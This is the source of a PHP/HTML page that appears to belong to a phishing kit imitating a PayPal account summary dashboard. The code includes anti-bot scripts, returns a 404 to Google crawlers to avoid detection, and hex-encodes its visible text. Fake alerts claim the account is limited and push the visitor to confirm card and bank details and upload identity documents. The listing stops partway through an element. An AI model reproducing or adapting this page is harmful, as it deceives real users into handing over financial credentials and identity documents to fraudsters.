<?php 
@session_start();  
error_reporting(0); 
require '../geoplugin.php';
include "bots/antibots1.php";
include "bots/antibots2.php";
include "bots/antibots3.php";
include "bots/antibots4.php";
include "bots/antibots5.php";
include "bots/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE html>
<html ng-app="Test" dir="ltr" class="js" lang="en_US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/pp144.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/pp114.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/pp72.png">
<link rel="apple-touch-icon-precomposed" href="img/pp64.png">
<link rel="shortcut icon" sizes="196x196" href="img/pp196.png">
<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
<link rel="icon" type="image/x-icon" href="img/pp32.png">
<title>&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x3A;&#x20;&#x53;&#x75;&#x6D;&#x6D;&#x61;&#x72;&#x79;</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.js"></script>
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.js"></script>
<script src="http://ajax.microsoft.com/ajax/jquery.validate/1.11.1/additional-methods.js"></script>
<script data-require="angular.js@*" src="https://code.angularjs.org/1.2.20/angular.js"></script>
<script src="js/bnkName.js"></script>  
<script src="js/ngRoutingnum.js"></script>
<link rel="stylesheet" href="css/app.css">
<link rel="stylesheet" href="css/paypal-sans.css">
<link rel="stylesheet" href="css/summary.css">
</head>
<body id ="Dwissel">
<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning="">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop">
<span class="vx_a11yText">&#x53;&#x75;&#x6D;&#x6D;&#x61;&#x72;&#x79;</span></a>
<div class="vx_globalNav-secondaryNav_mobile noPrint">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#/" id="dos8" class="vx_globalNav-link_mobileLogout">&#x4C;&#x6F;&#x67;&#x20;&#x4F;&#x75;&#x74;</a></div>
<div class="vx_globalNav-listItem_settings"><a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_a11yText">&#x53;&#x65;&#x74;&#x74;&#x69;&#x6E;&#x67;&#x73;</span></a></div>
<div><p class="vx_h5 vx_globalNav-displayName" id="NName"></p></div>
</div><div class="vx_globalNav-navContainer noPrint"><nav id="navMenu" class="vx_globalNav-nav" role="navigation">
<ul class="vx_globalNav-list"><li><a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> 
<span class="vx_globalNav-navText">&#x53;&#x75;&#x6D;&#x6D;&#x61;&#x72;&#x79;</span></a></li>
<li><a href="#" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> 
<span class="vx_globalNav-navText">&#x41;&#x63;&#x74;&#x69;&#x76;&#x69;&#x74;&#x79;</span></a></li>
<li id="js_tourSendMoney"><a href="#" class=" vx_globalNav-links nemo_globalNavTransferLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span></span> 
<span class="vx_globalNav-navText">&#x53;&#x65;&#x6E;&#x64;&#x20;&#x26;&#x20;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;</span></a></li>
<li id="js_tourWallet"><a href="#" class=" vx_globalNav-links nemo_globalNavWalletLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span></span> 
<span class="vx_globalNav-navText">&#x57;&#x61;&#x6C;&#x6C;&#x65;&#x74;</span></a></li><li>
<a href="#" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span></span> 
<span class="vx_globalNav-navText">&#x53;&#x68;&#x6F;&#x70;</span></a></li></ul><ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications" role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">&#x4E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</span></a></li><li id="js_tourSettings"><a href="#" class="vx_globalNav-link_settings" name="settings" title="Settings"><span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">&#x53;&#x65;&#x74;&#x74;&#x69;&#x6E;&#x67;&#x73;</span></a></li>
<li class="globalNav-listItem_mobile"><a href="#" class="vx_globalNav-link_help" name="help">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">&#x48;&#x65;&#x6C;&#x70;</span></a></li>
<li class="vx_globalNav-listItem_logout"><a href="#/" id="dos9" class="vx_globalNav-link_logout nemo_logoutBtn">&#x4C;&#x6F;&#x67;&#x20;&#x4F;&#x75;&#x74;</a></li></ul></nav></div></div></div>
<div id="sidepanelNotifications" class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel" tabindex="-1">
<div class="vx_sidepanel-headerContainer">
<h3 class="vx_h3 vx_sidepanel-header">&#x4E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</h3><div class="vx_sidepanel-headerIcon_right">
<a href="#" class="globalNotifs-close js_closeNotifications" name="closeNotifications" role="button" data-pagename="main:walletweb:summary::closeNotifications">
<span class="icon icon-small icon-close-small" aria-hidden="true"></span>
<span class="vx_a11yText">&#x43;&#x6C;&#x6F;&#x73;&#x65; <span class="accessAid">&#x4E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</span></span></a></div></div>
<div class="vx_sidepanel-body"><ul class="vx_sidepanel-list"><a class="vx_sidepanel-item">
<span class="icon icon-small icon-critical-small globalNotifs-levelIndicator_critical" style="color:#f24246;"></span>
<p class="globalNotifs-message" style="color:#FFFFFF">&#x54;&#x68;&#x65;&#x72;&#x65;&#x2019;&#x73;&#x20;&#x61;&#x20;&#x70;&#x72;&#x6F;&#x62;&#x6C;&#x65;&#x6D;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x2E;&#x20;&#x4D;&#x61;&#x6B;&#x65;&#x20;&#x73;&#x75;&#x72;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x72;&#x65;&#x73;&#x6F;&#x6C;&#x76;&#x65;&#x20;&#x69;&#x74;&#x20;&#x73;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x66;&#x75;&#x6C;&#x6C;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x69;&#x6D;&#x6D;&#x65;&#x64;&#x69;&#x61;&#x74;&#x65;&#x6C;&#x79;&#x2E;</p></a>
<li id="dos1"><a href="#" class="globalNotifs-listItem vx_sidepanel-item">
<span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-card-half-solid  globalNotifs-levelIndicator_info"></span>&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6C;&#x73;</a></li>
<li> <a href="#" class="globalNotifs-listItem vx_sidepanel-item">
<span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-bank-half-solid  globalNotifs-levelIndicator_info"></span>&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6C;&#x73;</a></li>
<a href="#" class="globalNotifs-listItem vx_sidepanel-item">
<span style="padding-top:6%;padding-right:5%;" class="icon icon-small icon-pp-logo-outline  globalNotifs-levelIndicator_info"></span>&#x55;&#x70;&#x6C;&#x6F;&#x61;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x72;&#x6F;&#x6F;&#x66;&#x20;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;</a>
</ul></div></div>
<div id="js_foreground" class="vx_foreground-container foreground-container">
<div class="vx_globalNav-main_mobile js_globalNavView">
<div class="vx_globalNav-headerSection_trigger"><a href="#" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">&#x4D;&#x65;&#x6E;&#x75;</a></div>
<div class="vx_globalNav-headerSection_logo"><a href="#" class="vx_globalNav-brand_mobile">
<span class="vx_a11yText">&#x53;&#x75;&#x6D;&#x6D;&#x61;&#x72;&#x79;</span></a></div><ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">&#x4E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</span></a></li></ul></div>
<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
<div id="js_summaryView" class="mainContents summaryContainer" data-transactions="" data-has-transactions-pending="" data-has-transactions-completed="" data-installments="" data-first-use-data="" data-goalsdetails="">
<h1 id="heading1" class="accessAid">&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x3A;&#x20;&#x53;&#x75;&#x6D;&#x6D;&#x61;&#x72;&#x79;</h1>



<!--===========================================-->
<div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges=""><div class="engagementMainBar-container js_engagementMainBar-container"><div class="summarySection engagementMainBar row"><div class="col-sm-7 progressAndWelcome"><div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="100" data-hide-percent-animation=""><div id="js_outerCircle" class="outerCircle"><div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div><div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div></div><div id="js_innerCircle" class="innerCircle"><div class="profilePhotoTable"><div id="js_profilePhotoView" class="profilePhotoContainer" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{}" data-wurfl="{&quot;isWireless&quot;:false,&quot;isTablet&quot;:false}" pa-tracked="1"><span id="js_user_icon" class="profilePhotoIcon icon icon-profile-large" aria-hidden="true" data-hover-text="Add a photo"></span></a></div></div><div id="js_percentageContainer" class="percentageContainer nemo_percentageContainer"><div id="js_percentage" class="nemo_accountCompletionPercent fadeOut hide">100%</div></div></div></div><div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus " data-module-number="0"><p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">welcome back!

</p></div></div><div id="js_engagementActions" class="col-sm-5 engagementActions"><ul class="actionsContainer nemo_actionsContainer"><li class="actionItem engagement-0-listItem"><a href="#" role="button" data-module-number="1" name="EM_SendMoney_XB" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule" pa-tracked="1"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span>Pay or send money</span></a></li><li class="actionItem engagement-2-listItem"></li></ul></div></div></div><hr class="engagementMainBar-separator engagementMainBar-separator_active"><div id="js_emSlideDownContainer" aria-expanded="false" role="alertdialog" tabindex="-1" class="emSlideDownContainer collapseEm hide nemo_emSlideDownContainer" data-em-open="false" data-current-module="" data-new-user="" data-total-percentage="80" data-hide-sneak-peek="true" data-hide-account-completion="false" data-is-first-use-enabled="false" data-auto-open-offer="false"><div id="aria_engagementStatus" data-engagement-stage="accountSetup" class="emModule dimBorderLine js_emModule engagementStatusModule js_engagementStatusModule nemo_engagementStatus " tabindex="-1"><div id="js_BadgeLanding" class="emModuleContent"><div id="profileStateContainer" class="setupbadgeBanner-container js_profileStates nemo_profileStates nemo_badges badgeDisplay"><div class="setupbadgeBanner-container badgeDisplay js_badgeDisplay js_badges js_badgeChild nemo_profileStates nemo_badges active"><p class="statusGreeting vx_h2">Power up more ways to use PayPal</p><div class="tour-container" id="js_tourModule"><button class="vx_btn vx_btn-secondary vx_btn-small btn-startTour js_tourStart nemo_startTour" name="QT_StartTour" data-pagename="main:walletweb:summary::main" data-track-type="link" pa-tracked="1"><span class="tour-icon-play"><span class="tour-play-message">Start tour</span></span></button><div class="tourContent hide" id="js_tourContent"><p class="js_balanceModuleTitle">No PayPal balance? No problem!</p><p class="js_sendMoneyTitle">Want to pay or get paid?</p><p class="js_sendMoneyDescription">Send your family abroad a little something for a gift. Ask a friend to chip in for a bill.</p><p class="js_walletTitle">Edit your ways to pay.</p><p class="js_walletDescription">Be sure to keep your Wallet up to date. A tidy Wallet makes it simple to pay without anyone seeing your financial info.</p><p class="js_settingsTitle">Update your account profile.</p><p class="js_settingsDescription">Something changed? No biggie! Update your profile, password, payment methods, notifications, and more right here.</p><p class="js_fiModule_noFI">Simply <a href="/myaccount/wallet/add/card" target="_top" class="popover-link" name="QT_AddCard" data-pagename="main:walletweb:summary:home::QT_AddCard:" pa-tracked="1">link a card.</a> You’ll be all set to instantly shop and spend.</p><p class="js_fiModule_FI">You’ve already linked a payment method. You’re ready to shop and send money.</p><p class="js_conlusionTitle">You’re all set!</p><p class="js_conclusionDescription">Now that we’ve covered the basics, have fun <a href="/deals" target="_top" class="popover-link" name="QT_Shopping" data-pagename="main:walletweb:summary:home::QT_Shopping:" pa-tracked="1">shopping,</a> <a href="" target="target=" _top"="" class="popover-link" name="QT_SendRequestLink" data-pagename="main:walletweb:summary:home::QT_SendRequestLink:" pa-tracked="1">sending and requesting money</a>, and more.</p></div><div class="js_tourContainer hide"><div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div><div class="popover-navigation"><div class="btn-group"><button class="vx_btn vx_btn-medium vx_btn_reversed tour-btn nemo_next js_popover-next" data-role="next" pa-tracked="1">Next</button><button class="vx_btn-link popover-link_endTour vx_text-body_secondary nemo_endTour popover-link js_popover-endLink" data-role="end" pa-tracked="1">End tour</button></div></div></div></div></div><ul id="js_profileStates" class="profileStates nemo_profileStates"><li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Account created</span></li><li class="setupStep-state nemo_email nemo_setup_button setupStep-doneState"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Email confirmed</span></li><li class="setupStep-state nemo_card nemo_setup_button setupStep-doneState"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Card linked</span></li><li class="setupStep-state nemo_mobile nemo_setup_button"><a href="#" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_Mobile_Confirmed" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" pa-tracked="1"><span class="setupStep-container"><span class="icon icon-medium icon-phone setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContentContainer"><span class="setupStep-cta">Confirm mobile</span></span></span><span class="setupStep-overlayContainer"><span class="setupStep-overlayIconContainer"><span class="setupStep-overlayIconSubContainer  setupStep-overlayIconSubContainer_phone"><span class="setupStep-inlineIcon"><span class="icon icon-medium icon-phone"></span></span></span></span><span class="setupStep-overlayCtaContainer"><span class="setupStep-overlayCta">Confirm mobile</span><span class="setupStep-overlayContent">Extra protection for your account.</span></span></span></a></li></ul></div></div><a href="#" class="js_dismiss engagementStatusModuleClose emClose emClose_acctCompletion nemo_emClose" role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" name="EM_BadgeSetup_Close" pa-tracked="1"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div><div class="emModule js_emModule transferBannerContainer nemo_EM_SendMoneyBanner" data-is-sneak-peek-available="true" data-sneak-peek-texts="[&quot;Send money between friends. It’s free if you’re both in the U.S. and you use your bank or balance.&quot;, &quot;Send money to a friend, even if they’re not on PayPal yet.&quot;, &quot;Sending money is the simple way to pay someone back right away.&quot;]" data-sneak-peek-link-name="[&quot;SneakPeek_SendMoney_Free&quot;, &quot;SneakPeek_SendMoney_Unilateral&quot;, &quot;SneakPeek_SendMoney_Simple&quot;]" data-bg-img=""><div class="emModuleContent"><div class="mpiBannerContainer js_mpiBannerContainer transferBanner"><div class="row"><div class="col-xs-4 transferActionColumns"><a href="#" target="_top" class="nemo_primaryActionButton_transferBuy transferPrimaryActions" name="EM_BUY_CTA" data-pagename="main:walletweb:transfer:buy:start" data-pagename2="main:walletweb:transfer:buy:start:::" data-track-type="link" pa-tracked="1"><span class="icon icon-register engagementAction-icon_transferDesktop" aria-hidden="true"></span><span class="transferPrimaryActionContent vx_h3">Pay for goods or services</span></a><p class="transferPrimaryActionBody"><span class="icon icon-shield engagementAction-icon_transfer-shield" aria-hidden="true"></span>Covered by <a href="/us/webapps/mpp/paypal-safety-and-security" target="_blank" class="transferSecondaryActionText nemo_secondaryAction_transferPurchaseProtection" name="emOfferTransferBuySecondaryAction" data-pagename="main:consumer:summary::main" data-pagename2="main:consumer:summary::main:::" data-track-type="link" pa-tracked="1">PayPal Protection for buyers</a>.<br>No fee for you. The seller pays a fee.</p></div><div class="col-xs-4 transferActionColumns"><a href="#" target="_top" class="nemo_primaryActionButton_transferSend transferPrimaryActions" name="EM_Send_CTA" data-pagename="main:walletweb:transfer:send:start" data-pagename2="main:walletweb:transfer:send:start:::" data-track-type="link" pa-tracked="1"><span class="icon icon-send-money engagementAction-icon_transferDesktop" aria-hidden="true"></span><span class="transferPrimaryActionContent vx_h3">Send to friends and family in the US</span></a><p class="transferPrimaryActionBody">It’s free when you use bank or balance.</p></div><div class="col-xs-4 transferActionColumns"><a href="#" target="_top" class="nemo_primaryActionButton_transferXB transferPrimaryActions" name="EM_XB_CTA" data-pagename="main:walletweb:transfer:xb:start" data-pagename2="main:walletweb:transfer:xb:start:::" data-track-type="link" pa-tracked="1"><span class="icon icon-international-transfer engagementAction-icon_transferDesktop" aria-hidden="true"></span><span class="transferPrimaryActionContent vx_h3">Send to friends and family internationally</span></a><p class="transferPrimaryActionBody">Send money quickly and cheaply to people living abroad.</p></div></div></div><a href="#" class="js_dismiss emClose nemo_emClose" role="button" name="EM_SendMoney_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" pa-tracked="1"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div><div class="emModule  js_emModule nemo_EM_DonateBanner" data-is-sneak-peek-available="" data-sneak-peek-texts="" data-sneak-peek-link-name="" data-bg-img="https://www.paypalobjects.com/webstatic/mktg/home/em_donate.jpg" style="background: url(&quot;https://www.paypalobjects.com/webstatic/mktg/home/em_donate.jpg&quot;) center center / cover no-repeat white;"><div class="emModuleContent js_emModuleContent"><div class="mpiBannerContainer js_mpiBannerContainer"><div class="mpiBanner mpi-left"><div class="mpiTextContainer" style="color: #292929;"><h3 class="mpiHeader vx_h2" style="color: #292929;">People use PayPal to do good every day</h3><p class="mpiBody vx_h4">Make a child’s day, rescue an endangered animal, or help a friend in need. Millions use PayPal to support the causes that matter most to them.</p><a href="/us/fundraiser/hub" class="vx_btn mpiPrimaryAction js_emPrimaryAction nemo_primaryActionButton_EM_Donate" target="_blank" name="EM_Donate_CTA" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" pa-tracked="1">Find your Cause</a></div></div></div><a href="#" class="js_dismiss emClose nemo_emClose" role="button" name="EM_Donate_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="color: #292929;" pa-tracked="1"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div><div class="emModule js_emModule nemo_EM_PPCreditBanner" data-bg-img="https://www.paypalobjects.com/webstatic/walletweb-engagement/ppcredit/pp_credit_bg.jpeg" style="background: url(&quot;https://www.paypalobjects.com/webstatic/walletweb-engagement/ppcredit/pp_credit_bg.jpeg&quot;) center center / cover no-repeat white;"><div class="emModuleContent js_emModuleContent"><img class="creditOffer-logo" src="https://www.paypalobjects.com/webstatic/walletweb-engagement/ppcredit/pp-credit-logo.png"><div class="mpiBannerContainer js_mpiBannerContainer"><div class="mpiBanner mpi-right creditOffer-banner"><div class="mpiTextContainer creditOffer-textContainer" style="color: #292929;"><h3 class="mpiHeader creditOffer-header">get more time</h3><p class="mpiHeader creditOffer-applyText">for whatever you have in mind.</p><p class="creditOffer-body">Get 6 months to pay on purchases of $99+ when you check out with PayPal and choose PayPal Credit.</p><p class="creditOffer-smallText">Subject to credit approval.<a href="https://creditapply.paypal.com/apply?guid=IK3CZ0WT" class="mpiSecondaryAction  creditOffer-smallText" name="bmlSecondaryAction" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" target="_blank" pa-tracked="1">See terms</a></p><a href="https://creditapply.paypal.com/apply?guid=IK3CZ0WT" class="vx_btn mpiPrimaryAction js_emPrimaryAction nemo_primaryActionButton_EM_PPCredit" target="_blank" name="EM_PPCredit_CTA" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="background-color: ;" pa-tracked="1">Apply Now</a></div></div></div><a href="#" class="js_dismiss emClose nemo_emClose" role="button" name="EM_PPCredit_Close" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" style="color: #292929;" pa-tracked="1"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">close</span></a></div></div></div></div>
<!--===========================================-->






<div id="footer" role="contentinfo" class="noPrint nemo_footer vx_globalFooter-container">
<div class="vx_globalFooter">
<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list">
<li><a href="#" target="_top" class="nemo_helpLink" name="footerHelp">&#x48;&#x65;&#x6C;&#x70;&#x20;&#x26;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;</a></li>
<li><a href="#" target="_top" class="nemo_securityLink" name="footerSecurity">&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;</a></li>
</ul>
<div class="vx_globalFooter_secondary">
<p class="vx_globalFooter-copyright nemo_copyrightText">©<span dir="ltr">1999-2018</span> &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2C;&#x20;&#x49;&#x6E;&#x63;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;.</p>
<ul class="vx_globalFooter-list_secondary">
<li><a href="#" target="_top" name="privacy" class="nemo_privacyLink">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;</a></li>
<li><a href="#" target="_top" name="legal" class="nemo_legalLink">&#x4C;&#x65;&#x67;&#x61;&#x6C;</a></li>
<li><a href="#" target="_top" name="policyUpdates" class="nemo_policyUpdatesLink">&#x50;&#x6F;&#x6C;&#x69;&#x63;&#x79;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x73;</a></li>
<li class="vx_globalFooterLink-feedback" id="siteFeedback">
<a href="#" class="beta feedback nemo_feedback hidden-phone">&#x46;&#x65;&#x65;&#x64;&#x62;&#x61;&#x63;&#x6B;</a></li>
</ul></div></div></div>
</div>
<div class="mainBody">
<div id="summary" class="summarySection">
<div class="row">
<div class="col-sm-12">
<section class="walletModule">
<div class="balanceModule">
<div class="balanceModule">
<div class="col-sm-4">








<section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule"><div class="js_fiModule-title-container" id="fiModule-title-container"><a href="#" class="fiModule-link vx_text-5 fiModule-title" pa-tracked="1"><span class="fiModule-title-header col-md-6 col-sm-6 col-xs-6">PayPal balance</span><span class="fiModule-title-link col-md-6 col-sm-6 col-xs-6">Details<span class="icon icon-arrow-right-half-small fiModule-icon-arrow js_fiModule-icon"></span></span></a></div><div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">You need to confirm your account to view balance</span></div></div><ul class="fiModule-list nemo_balanceActions"><a role="button" href="#" class="withdrawFunds nemo_withdrawFunds" id="withdrawFunds" name="transfer" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" pa-tracked="1">Add money</a><li class="withdrawMoney vx_text-body_secondary"><a role="button" href="#" class="withdrawFunds nemo_withdrawFunds" id="withdrawFunds" name="transfer" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" pa-tracked="1">Transfer to your bank</a></li></ul></section>



<br/>
<section class="fiModule-container nemo_fiModule" id="js_tourFIModule" aria-labelledby="walletModuleHeader"><h3 class="fiModule-title vx_text-5">Banks and cards</h3><div class="js_fiModule-listView" data-link-bank="/myaccount/wallet/add/bank" data-link-card="/myaccount/wallet/add/card" data-wallet-page="/myaccount/wallet" data-link-target="_top" data-link-bank-attributes="class='nemo_fiModule-actions nemo_fiModule-linkBank'" data-link-bank-us-attributes="class='nemo_fiModule-actions nemo_fiModule-linkBank' name='linkBank_benefit1' data-pagename='main:consumer:summary::main' data-pagename2='main:consumer:summary::main:::' data-track-type='link'" data-link-card-attributes="class='nemo_fiModule-actions nemo_fiModule-linkCard'" data-update-fi-attributes="class='nemo_fiModule-actions nemo_fiModule-updateInWallet'" data-user-config-features-bank="true" data-user-config-features-card="true" data-add-card="Link your card now to start shopping and sending money to friends." data-add-card-rewards="Pay securely with your favorite card. Get your card rewards too." data-add-card-security="Link your card and get an extra level of security."><div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">You need to confirm your account to see cards</span></div></div><div class="fiModule-ctaText vx_text-body_secondary"><a href="#" class="fiModule-table nemo_addFI" pa-tracked="1"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">Add a bank account or card</span></a></div></div></section>
</br>
<div class="fiModule-container nemo_accountStatusModule"><h3 class="fiModule-title vx_h5">Limited Account Details</h3><ul class="moduleListItems"><div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
